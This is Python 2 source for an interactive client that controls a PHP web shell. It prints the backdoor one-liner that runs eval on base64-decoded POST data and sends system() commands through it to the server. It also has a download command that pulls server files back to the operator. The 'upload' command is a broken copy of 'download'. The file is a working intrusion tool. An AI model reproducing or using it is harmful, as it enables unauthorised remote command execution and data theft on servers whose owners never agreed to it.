
import base64
import httplib
from urlparse import urlparse
from cmd import Cmd
import os


class rshell(Cmd):

    pwd = ""
    old_pwd = ""

    def __init__(self, shell_url, proxy):
        Cmd.__init__(self)
        self.shell_url = shell_url
        self.proxy = proxy

    def do_help(self, line):
        print "help: Show this message"
        print "payload: show the shell code in php"
        print "Or write a command to send the server shell"

    def default(self, line):
        #This is the default command method
        #system function is called with the command to execute
        cmd = "system('{0}');".format(line)
        #doing the request to the server
        (code, response) = self.dorequest(cmd)
        if code == 200:
            print response

    def emptyline(self):
        print "Deja de darle al enter"

    def do_quit(self, line):
        exit(0)

    def do_exit(self, line):
        exit(0)

    def dorequest(self, phpcmd):
        #Post request using the param parameter
        cmd_base64 = base64.encodestring(phpcmd)[:-1]
        fullurl = self.shell_url
        parsed_url = urlparse(fullurl)
        url = ''
        con = None
        params = "param={0}".format(cmd_base64)
        if self.proxy:
            (ip, port) = self.proxy.split(':')
            con = httplib.HTTPConnection(ip, int(port))
            url = fullurl
        else:
            url = parsed_url.path
            con = httplib.HTTPConnection(parsed_url.netloc, parsed_url.port)
        headers = {"Content-type": "application/x-www-form-urlencoded",
                   "Accept": "text/plain"}
        if con:
            con.request('POST', url, params, headers)
            response = con.getresponse()
            if response.status == 200:
                return (response.status, response.read())
            else:
                #
                return (response.status, None)
        else:
            #
            return (None, None)

    def do_shell(self, line):
        #This method execute the command locally
        print os.popen(line).read()

    def do_payload(self, line):
        self.print_payload()

    def do_phpinfo(self, line):
        #This is the default command method
        #system function is called with the command to execute
        s = "phpinfo();"
        #doing the request to the server
        self.dorequest(s)

    def print_payload(self):
        print "<?php eval(base64_decode($_POST['param'])); ?>"

    def do_download(self, line):
        files = line.split()
        cmd = "echo base64_encode(file_get_contents('{0}'));".format(files[0])
        (code, data) = self.dorequest(cmd)
        if code == 200:
            f = file(os.path.basename(files[0]), "w")
            f.write(base64.decodestring(data))
        else:
            print "Error"

    def do_upload(self, line):
        files = line.split()
        cmd = "echo base64_encode(file_get_contents('{0}'));".format(files[0])
        (code, data) = self.dorequest(cmd)
        if code == 200:
            f = file(os.path.basename(files[0]), "w")
            f.write(base64.decodestring(data))
        else:
            print "Error"
